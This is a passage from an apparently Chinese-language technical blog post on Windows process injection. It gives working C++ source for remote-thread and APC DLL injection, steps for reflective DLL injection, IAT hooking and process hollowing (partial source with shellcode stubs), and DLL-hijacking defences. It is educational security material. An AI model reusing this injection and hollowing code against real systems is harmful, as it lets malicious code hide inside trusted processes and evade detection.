","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:3:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e #include \u003cio.h\u003e#include \u003ctchar.h\u003e#include \u003cwindows.h\u003e#include \u003cTlhelp32.h\u003e#include \u003cShlwapi.h\u003e#pragma comment(lib,\"Shlwapi.lib\") /************************************************************************ 函数名称：RemoteInjectDll 函数功能：向目标进程中注入一个指定 Dll 参 数：pDllPath dll的存放路径 返 回 值：成功返回PID/失败返回NULL ************************************************************************/ DWORD GetProcessIDFromName(const TCHAR* pProcName) { HANDLE hSnapshot = NULL; BOOL bStatus = FALSE; DWORD dwProcessId = 0; PROCESSENTRY32 pi = { 0 }; pi.dwSize = sizeof(pi); hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == NULL) { return NULL; } bStatus = ::Process32First(hSnapshot, \u0026pi); while (bStatus) { if (memcmp(pProcName, pi.szExeFile, ::_tcslen(pProcName)) == 0) { dwProcessId = pi.th32ProcessID; break; } bStatus = ::Process32Next(hSnapshot, \u0026pi); } if (hSnapshot != NULL) { ::CloseHandle(hSnapshot); } return dwProcessId; } /************************************************************************ 函数名称：RemoteInjectDll 函数功能：向目标进程中注入一个指定 Dll 参 数1：pProcName 进程名 参 数2：pDllPath dll的存放路径 返 回 值：注入成功返回TRUE/注入失败返回FALSE ************************************************************************/ BOOL RemoteInjectDll(const TCHAR* pProcName, const TCHAR* pDllPath) { HANDLE hProcess = NULL, hThread = NULL; DWORD dwSize = 0, dwProcessId = 0; BOOL bRet = FALSE; TCHAR* pRemoteBuf = NULL; LPTHREAD_START_ROUTINE lpThreadFun = NULL; // 参数无效 if (pProcName == NULL || ::_tcslen(pProcName) == 0 || pDllPath == NULL || ::_tcslen(pDllPath) == 0) { return FALSE; } // 指定 Dll 文件不存在 if (_taccess(pDllPath, 0) == -1) { return false; } do { //获取进程ID dwProcessId = GetProcessIDFromName(pProcName); if (dwProcessId == 0) { break; } // 获取目标进程句柄 hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) { break; } // 在目标进程中分配内存空间 dwSize = (DWORD)::_tcslen(pDllPath) + 1; pRemoteBuf = (TCHAR*)::VirtualAllocEx(hProcess, NULL, dwSize * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE); if (pRemoteBuf == NULL) { break; } // 在目标进程的内存空间中写入所需参数(模块名) if (FALSE == ::WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)pDllPath, dwSize * sizeof(TCHAR), NULL)) { break; } // 获取 LoadLibrary 地址 #ifdef _UNICODE lpThreadFun = (PTHREAD_START_ROUTINE)::GetProcAddress(::GetModuleHandle(_T(\"Kernel32\")), \"LoadLibraryW\"); #else lpThreadFun = (PTHREAD_START_ROUTINE)::GetProcAddress(::GetModuleHandle(_T(\"Kernel32\")), \"LoadLibraryA\"); #endif if (lpThreadFun == NULL) { break; } // 创建远程线程调用 LoadLibrary hThread = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpThreadFun, pRemoteBuf, 0, NULL); if (hThread == NULL) { break; } // 等待远程线程结束 ::WaitForSingleObject(hThread, INFINITE); bRet = TRUE; } while (0); if (hThread != NULL) { ::CloseHandle(hThread); } if (pRemoteBuf != NULL) { ::VirtualFreeEx(hProcess, pRemoteBuf, dwSize, MEM_DECOMMIT); } if (hProcess != NULL) { ::CloseHandle(hProcess); } return bRet; } /************************************************************************ 函数名称：UnRemoteInjectDll 函数功能：从目标进程中卸载一个指定 Dll 参 数1：pProcName 进程名 参 数2：pDllPath dll的存放路径 返 回 值：卸载成功返回TRUE/卸载失败返回FALSE 备 注：采用远程线程注入技术实现 ************************************************************************/ BOOL UnRemoteInjectDll(const TCHAR* pProcName, const TCHAR* pDllPath) { HANDLE hModuleSnap = INVALID_HANDLE_VALUE, hProcess = NULL, hThread = NULL; TCHAR* pModuleName = PathFindFileName(pDllPath); BOOL bRet = FALSE, bFound = FALSE; DWORD dwProcessId = 0; MODULEENTRY32 me32 = { 0 };; me32.dwSize = sizeof(me32); // 参数无效 if (pProcName == NULL || ::_tcslen(pProcName) == 0 || pDllPath == NULL || ::_tcslen(pDllPath) == 0) { return FALSE; } do { //获取进程ID dwProcessId = GetProcessIDFromName(pProcName); if (dwProcessId == 0) { break; } // 获取模块快照 hModuleSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId); if (hModuleSnap == INVALID_HANDLE_VALUE) { break; } if (::Module32First(hModuleSnap, \u0026me32) == FALSE) { break; } do { bFound = (::_tcsicmp(me32.szMo","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:3:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"进阶 可参考下方链接中的加强版远程线程注入. https://bbs.pediy.com/thread-269910.htm#msg_header_h1_3 常见的几种DLL注入技术-编程技术.mhtml ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:3:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"反射Dll注入 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:4:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Dll编写 导出一个函数,如ReflectiveLoader. 借助caller()函数(获得当前指令的下条指令的地址),找到当前映射到内存的地址,然后逐字节向上遍历,当查找到符合PE格式的文件头之后，就可以认为找到了DLL文件在内存中的地址了. 新申请一片内存,用于存放当前Dll文件. 修复上述内存中Dll,导入表,重定位表等. 调用Dll入口函数. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:4:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"注入工具编写 用CreateFile,ReadFile读取上述DLL到缓冲区中. 解析上述缓冲区中的PE格式,通过导出表拿上述导出函数偏移地址,ReflectiveLoader. 利用OpenProcess,VirtualAllocEx,WriteProcessMemory将上述Dll写入到远程进程中. 利用CreateRemoteThread,传Base+上述导出函数ReflectiveLoader的偏移地址,执行Dll中的导出函数. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:4:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 https://github.com/stephenfewer/ReflectiveDLLInjection ReflectiveDLLInjection.7z ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:4:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Dll劫持 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 如果在进程尝试加载一个DLL时,并没有指定DLL的绝对路径,那么Windows会尝试按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录,那么就能够欺骗系统去加载恶意的DLL,形成\"劫持\". https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order 默认情况下启用安全DLL搜索模式.要禁用此功能,可以创建HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode注册表值并将其设置为0. 如果启用SafeDllSearchMode,搜索顺序如下: 应用程序Exe所在的路径. 系统目录,使用GetSystemDirectory函数可以获取该路径. 16位系统目录. Windows目录,使用GetWindowsDirectory函数可以获取该路径. 当前目录. PATH环境变量中列出的目录. 如果禁用SafeDllSearchMode,搜索顺序如下: 应用程序Exe所在的路径. 当前目录.当前目录的搜索顺序被提前了,较容易遭到DLL劫持攻击. 系统目录. 16位系统目录. Windwos目录. PATH环境变量中列出的目录. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"方式 在自己的dll中导出和劫持的目标dll相同的函数接口,然后在自己的接口函数中调用原始dll的函数,如此使得原始dll的功能能够被正常使用. 在自己的dll的dllmian中加载被劫持dll,然后修改loadlibrary的返回值为被劫持dll加载后的模块句柄. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 SuperDllHijack.7z ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"防护方法 添加KnownDLL. HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 该项下的子键代表了dll的名字,如果这里存在user32.dll,则系统不会加载当前目录下的user.dll,而是会去系统盘加载. 对于系统DLL,不通过修改本机KnownDLLs进行单机防护,而是通过修改文件manifest属性进行定向加载DLL来解决通用系统DLL劫持问题. 对于非系统第三方DLL,上面的方法就不太适用了,可以使用动态加载方式,不要使用静态导入方式加载,通过动态加载对文件进行校验,如数字签名校验通过后再进行加载,来保证程序的安全性. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:4","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"参考链接 [如何禁用软件DLL劫持][https://www.52pojie.cn/thread-1499316-1-1.html] [一种通用DLL劫持技术研究][https://bbs.pediy.com/thread-248050.htm] 如何禁用软件DLL劫持.mhtml 一种通用DLL劫持技术研究.mhtml ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:5:5","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"APC注入 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:6:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 利用当线程被唤醒时APC中的注册函数会被执行的机制,并以此去执行我们的DLL加载代码,进而完成DLL注入. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:6:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"APC示例 #include \u003cstdlib.h\u003e#include \u003cstdio.h\u003e#include \u003cWindows.h\u003e#include \u003cTlHelp32.h\u003e#include \u003ctchar.h\u003e DWORD GetPidByPname(char* pszProcessName) { DWORD id = 0; //获得系统快照句柄 (得到当前的所有进程) HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pInfo; //用于保存进程信息的一个数据结构 pInfo.dwSize = sizeof(pInfo); //从快照中获取进程列表 Process32First(hSnapShot, \u0026pInfo); //从第一个进程开始循环 do { //这里的 pszProcessName 为你的进程名称 //strcmp(_strlwr(_strdup(pInfo.szExeFile)), pszProcessName) == 0 if (strcmp(pInfo.szExeFile, pszProcessName) == 0) { id = pInfo.th32ProcessID; break; } } while (Process32Next(hSnapShot, \u0026pInfo) != FALSE); return id; } BOOL GetAllTidByPid(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength) { DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBuffLength = 1000; THREADENTRY32 te32 = { 0 }; HANDLE hSnapShot = NULL; BOOL bRet = TRUE; do { //申请内存 pThreadId = new DWORD[dwBuffLength]; if (pThreadId == NULL) { bRet = FALSE; break; } else { } RtlZeroMemory(pThreadId, (dwBuffLength * sizeof(DWORD))); //获取线程快照 RtlZeroMemory(\u0026te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hSnapShot == NULL) { bRet = FALSE; break; } else { } //获取第一条快照的信息 bRet = Thread32First(hSnapShot, \u0026te32); while (bRet) { //获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) { pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; } //遍历下一个线程快照信息 bRet = Thread32Next(hSnapShot, \u0026te32); } //返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; } while (FALSE); if (FALSE == bRet) { if (pThreadId) { delete[] pThreadId; pThreadId = NULL; } } return bRet; } BOOL APCInject(char* pszProcessName, char* pszDllName) { BOOL bRet = FALSE; DWORD dwProcessId = 0; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryAFunc = NULL; SIZE_T dwRet = 0; DWORD dwDllPathLen = strlen(pszDllName) + 1; DWORD i = 0; do { //根据进程名称获取PID dwProcessId = GetPidByPname(pszProcessName); if (0 \u003e= dwProcessId) { bRet = FALSE; break; } else { } //根据PID bRet = GetAllTidByPid(dwProcessId, \u0026pThreadId, \u0026dwThreadIdLength); if (bRet == FALSE) { bRet = FALSE; break; } else { } //打开注入进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) { bRet = FALSE; break; } else { } //在注入的进程空间申请内存 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) { bRet = FALSE; break; } else { } //向申请的空间中写入DLL路径数据 WriteProcessMemory(hProcess, pBaseAddress, pszDllName, dwDllPathLen, \u0026dwRet); if (dwRet != dwDllPathLen) { bRet = FALSE; break; } else { } //获取LoadLibrary的地址 pLoadLibraryAFunc = GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\"); if (pLoadLibraryAFunc == NULL) { bRet = FALSE; break; } else { } //遍历线程 插入APC for (i = 0; i \u003c dwThreadIdLength; i++) { //打开线程 hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) { //插入APC QueueUserAPC((PAPCFUNC)pLoadLibraryAFunc, hThread, (ULONG_PTR)pBaseAddress); //关闭线程句柄 CloseHandle(hThread); hThread = NULL; } } bRet = TRUE; } while (FALSE); //释放内存 if (hProcess) { CloseHandle(hProcess); hProcess = NULL; } if (hThread) { delete[] pThreadId; pThreadId = NULL; } return bRet; } int main() { TCHAR szDllPath[MAX_PATH] = { 0 }; GetCurrentDirectory(MAX_PATH, szDllPath); _tcscat(szDllPath, TEXT(\"\\\\LuoDll.dll\")); APCInject(\"Clover.exe\", szDllPath); system(\"pause\"); return 0; } ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:6:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 APC注入.7z ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:6:3","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"IAT Hook IAT Hook是恶意软件用于更改导入地址表的技术.当合法应用程序调用位于DLL中的API时,其会执行替换的函数,而不是原始函数. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:7:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"实现示例 http://hasherezade.github.io/IAT_patcher/ IAT_patcher.zip ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:7:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"傀儡进程 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:8:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 借助正常的软件进程或系统进程的外壳来执行非正常的恶意操作. 挂起创建一个正常程序,如svchost.exe. 利用VirtualAllocEx,WriteProcessMemory将自己的PeLoader,自己的程序写入上述挂起的进程中. 修改上述挂起程序的OEP处为下方指令. #x86 Push1 BufferAddress #将自己的程序Buffer入栈 Call CallAddress #调用x86_PeLoader #x64 sub rsp, -0x28 mov rcx, BufferAddress #将自己的程序Buffer传给rcx mov rax, CallAddress call rax #调用x64_PeLoader add rsp, 0x28 jmp rax 恢复上述挂起的进程. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:8:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstrsafe.h\u003e#include \u003cWindows.h\u003e #include \"define_ntdll.h\"#include \"ShellCode/ShellCode.h\"#include \"ShellCode/ShellCode64.h\"#include \"LuoFile.h\" typedef void* (_cdecl* _pfnmemcpy)(void*, void*, size_t); typedef void* (_cdecl* _pfnmemset)(void*, int, size_t); typedef BOOL(WINAPI* PFNCreateProcess)(LPSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); typedef BOOL(WINAPI* PFNReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead); typedef BOOL(WINAPI* PFNWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten); typedef DWORD(WINAPI* PFNResumeThread)(HANDLE hThread); typedef NTSTATUS(WINAPI* PFNZwQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength); typedef LPVOID(WINAPI* PFNVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef LPVOID(WINAPI* PFNVirtualProtectEx)(__in HANDLE hProcess, __in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flNewProtect, __out PDWORD lpflOldProtect); typedef BOOL(WINAPI* PFNWinStationTerminateProcess)(HANDLE ServerHandle, ULONG ProcessId, ULONG ExitCode); static _pfnmemcpy pfnmemcpy = NULL; static _pfnmemset pfnmemset = NULL; static PFNZwQueryInformationProcess pfnZwQueryInformationProcess = NULL; static PFNVirtualAllocEx pfnVirtualAllocEx = NULL; static PFNWriteProcessMemory pfnWriteProcessMemory = NULL; static PFNCreateProcess pfnCreateProcess = NULL; static PFNResumeThread pfnResumeThread = NULL; static PFNWinStationTerminateProcess pfnWinStationTerminateProcess = NULL; BOOL Initialize() { HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\"); pfnmemset = (_pfnmemset)GetProcAddress(ntdll, \"memset\"); pfnmemcpy = (_pfnmemcpy)GetProcAddress(ntdll, \"memcpy\"); pfnZwQueryInformationProcess = (PFNZwQueryInformationProcess)GetProcAddress(ntdll, \"ZwQueryInformationProcess\"); HMODULE Kernel = GetModuleHandleA(\"kernel32.dll\"); pfnVirtualAllocEx = (PFNVirtualAllocEx)GetProcAddress(Kernel, \"VirtualAllocEx\"); pfnWriteProcessMemory = (PFNWriteProcessMemory)GetProcAddress(Kernel, \"WriteProcessMemory\"); pfnCreateProcess = (PFNCreateProcess)GetProcAddress(Kernel, \"CreateProcessA\"); pfnResumeThread = (PFNResumeThread)GetProcAddress(Kernel, \"ResumeThread\"); HMODULE hWinStaDll = LoadLibrary(TEXT(\"WINSTA.dll\")); pfnWinStationTerminateProcess = (PFNWinStationTerminateProcess)GetProcAddress(hWinStaDll, \"WinStationTerminateProcess\"); if (pfnmemcpy == NULL || pfnmemset == NULL || pfnZwQueryInformationProcess == NULL || pfnVirtualAllocEx == NULL || pfnWriteProcessMemory == NULL || pfnCreateProcess == NULL || pfnResumeThread == NULL ) { return FALSE; } return TRUE; } // -1 不是合法PE 1 32位 2 64位 3 未知 int AnalyzeBuffer(LPBYTE pBuffer) { IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBuffer; if (pDosHeader-\u003ee_magic != IMAGE_DOS_SIGNATURE) { return -1; } IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((char*)pBuffer + pDosHeader-\u003ee_lfanew); if (pNtHeader-\u003eSignature != IMAGE_NT_SIGNATURE) { return -1; } if (pNtHeader-\u003eFileHeader.Machine == IMAGE_FILE_MACHINE_I386) { return 1; } if (pNtHeader-\u003eFileHeader.Machine == IMAGE_FILE_MACHINE_IA64 || pNtHeader-\u003eFileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) { return 2; } return 3; } BOOL StartProcess(LPBYTE pBuffer, DWORD Length) { STARTUPINFO si; PROCESS_INFORMATION pi; PEB peb; SIZE_T Index = 0; SHELLCODE ShellCode; SHELLCODE64 ShellCode64; PROCESS_BASIC_INFORMATION pbi; IMAGE_DOS_HEADER ImgDosheader; IMAGE_NT_HEADERS ImgNtHeaders; SIZE_T len = 0; LPVOID remoteBuffer = NULL; LPVOID remoteShell = NULL; ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:8:2","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Process Hollowing 此技术也可称为傀儡进程,亦可称为PE映像切换技术. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:9:0","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"原理 借助正常的软件进程或系统进程的外壳来执行非正常的恶意操作. 挂起创建一个正常程序,如svchost.exe. 利用NtQueryInformationProcess拿到上述挂起进程的PEB结构. 利用NtUnmapViewOfSection将上述挂起进程的内存映射清除. 利用VirtualAllocEx在上述挂起进程中申请到原pPEB-\u003elpImageBaseAddress地址. 利用WriteProcessMemory将我们写的程序复制到上述挂起进程中. 如果上述挂起进程的ImageBaseAddress与我们写的程序的ImageBaseAddress有差别,那就根据重定位表进行修复. 恢复上述挂起的进程. ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:9:1","tags":["进程注入"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"相关源码 #include \"stdafx.h\"#include \u003cprocessthreadsapi.h\u003e#include \"pe.h\"HANDLE CreateHollowedProcess(LPSTR lpCommandLine, LPSTR lpSourceFile) { cout \u003c\u003c \"--\u003eCreating Process.\" \u003c\u003c endl; //指定窗口工作站，桌面，标准句柄以及创建时进程主窗口的外观的结构体 LPSTARTUPINFOA lpStartupInfo = new STARTUPINFOA(); LPPROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION(); HANDLE hProcess; CreateProcessA(NULL, lpCommandLine, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, lpStartupInfo, lpProcessInformation ); hProcess = lpProcessInformation-\u003ehProcess; cout \u003c\u003c lpProcessInformation-\u003edwProcessId \u003c\u003c endl; if (!hProcess) { 